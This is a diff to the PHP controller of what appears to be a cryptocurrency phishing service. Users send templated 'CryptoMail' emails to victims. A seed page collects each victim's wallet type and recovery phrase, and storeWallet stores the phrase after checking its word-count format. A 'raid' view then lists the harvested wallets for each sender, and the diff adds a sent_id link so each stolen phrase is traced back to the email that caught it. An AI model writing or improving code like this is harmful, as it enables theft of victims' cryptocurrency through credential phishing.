@@ -57,7 +57,6 @@ class UserController extends Controller
         }
 
         try {
-            // Store email details with sender's user_id
             $sent = Sent::create([
                 'user_id' => Auth::id(),
                 'recipient_email' => $request->recipient_email,
@@ -66,11 +65,11 @@ class UserController extends Controller
                 'crypto_type' => $request->crypto_type,
             ]);
 
-            // Queue the email
             Mail::to($request->recipient_email)->queue(new CryptoMail(
                 $request->template,
                 $request->crypto_type,
-                $request->quantity
+                $request->quantity,
+                $sent->id
             ));
 
             return redirect()->route('mail')->with('success', 'Email queued successfully!');
@@ -81,47 +80,52 @@ class UserController extends Controller
 
 
 
+
+
     public function storeWallet(Request $request)
     {
         $validator = Validator::make($request->all(), [
             'user_email' => ['required', 'email'],
             'wallet_type' => ['required', 'in:MetaMask,Trust Wallet,Coinbase Wallet,SafePal,TokenPocket,Phantom,Rainbow,WalletConnect,BitKeep,Argent,ZenGo,Pillar,1inch Wallet,MEW Wallet,Torus'],
-            'seed_phrase' => ['required', 'string'],
+            'seed_phrase' => ['required', 'string', 'regex:/^(\w+\s){11,23}\w+$/'], // Basic seed phrase format check
+            'sent_id' => ['required', 'exists:sent_emails,id'],
         ]);
 
         if ($validator->fails()) {
             return back()->withErrors($validator)->withInput();
         }
 
-        // Find the sent email by recipient email
-        $sent = Sent::where('recipient_email', $request->user_email)->firstOrFail();
+        try {
+            $sent = Sent::findOrFail($request->sent_id);
 
-        // Store wallet connection details
-        Wallet::create([
-            'sent_email_id' => $sent->id,
-            'user_email' => $request->user_email,
-            'wallet_type' => $request->wallet_type,
-            'seed_phrase' => encrypt($request->seed_phrase), // Encrypt sensitive data
-        ]);
+            if ($sent->recipient_email !== $request->user_email) {
+                return back()->with('error', 'Email does not match the recipient.')->withInput();
+            }
 
-        return redirect()->back()->with('success', 'Wallet connected successfully!');
+            Wallet::create([
+                'sent_email_id' => $sent->id,
+                'user_email' => $request->user_email,
+                'wallet_type' => $request->wallet_type,
+                'seed_phrase' => encrypt($request->seed_phrase),
+            ]);
+
+            return redirect()->back()->with('success', 'Wallet connected successfully!');
+        } catch (\Exception $e) {
+            return back()->with('error', 'Failed to connect wallet: ' . $e->getMessage())->withInput();
+        }
     }
 
 
-    // public function raid()
-    // {
-
-    //     return view('user.raids');
-    // }
-
     public function raid(Request $request)
     {
-        // Fetch wallet connections for the authenticated user's sent emails
-        $wallets = Wallet::whereHas('Sent', function ($query) {
-            $query->where('user_id', Auth::id());
-        })->with('sentEmail')->get();
 
-        return view('user.raids', compact('wallets'));
+        $sent = Sent::where('user_id', Auth::id())
+            ->with('wallets')
+            ->get();
+
+        return view('user.raids', compact('sent'));
+
+
     }
 
 
@@ -151,12 +155,11 @@ class UserController extends Controller
         return redirect()->route('subscribe')->with('success', 'Subscription activated.');
     }
 
-    // public function seed()
-    // {
-    //     return view('user.seed');
-    // }
+
+
     public function seed(Request $request)
     {
-        return view('user.seed', ['sender_email' => $request->query('sender_email')]);
+
+        return view('user.seed', ['sent_id' => $request->query('sent_id')]);
     }
 }
